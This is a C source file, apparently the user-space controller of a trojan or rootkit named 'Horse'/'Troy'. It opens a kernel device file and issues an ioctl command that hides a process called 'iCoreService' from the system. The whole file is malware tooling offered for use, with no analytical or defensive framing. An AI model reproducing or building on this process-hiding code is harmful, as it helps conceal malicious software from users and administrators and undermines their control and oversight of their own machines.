//
//  main.c
//  Horse
//
//  Created by Axis on 5/10/15.
//  Copyright (c) 2015 Axis. All rights reserved.
//

#include "configure.h"
#include <sys/fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int m_fd=-1;

int connect_dev_files()
{
    printf("enter\n");
    printf("%s", TROY_ABSOLUTE_DEV_PATH);
    m_fd=open(TROY_ABSOLUTE_DEV_PATH, O_RDWR, 0600);
    if(m_fd<0)
    {
        printf("error!");
        return -1;
    }
    return 0;
}

void disconnect_dev_files()
{
    close(m_fd);
    m_fd=-1;
}

void usage()
{
    printf("***********************\n");
    printf("1. hide process named iCoreService\n");
    printf("0. quit");
    printf("***********************\n");
}

int main(int argc, const char * argv[])
{
    int ret=connect_dev_files();
    int not_exit=1;
    if(ret!=0)
    {
        printf("conect error");
        return 0;
    }

    int cmd=-1;

    while(not_exit)
    {
        usage();
        scanf("%d", &cmd);

        switch (cmd) {
            case 1:
                printf("hide_process");
                char *name="iCoreService";

                troy_hide_object obj;
                bzero(&obj, sizeof(obj));
                obj.objec_type=TROY_PROCESS;
                obj.name = (char*)malloc((strlen(name)+1)*sizeof(char));
                obj.name_len=strlen(name);
                bzero(obj.name, strlen(obj.name)+1);
                strcpy(obj.name, name);
                printf("%p\n", obj.name);
                ioctl(m_fd, TROY_CMD_HIDE_PROCESS, &obj);

                break;
            case 0:
                not_exit=0;
                break;
            default:
                break;
        }
    }


    disconnect_dev_files();
}
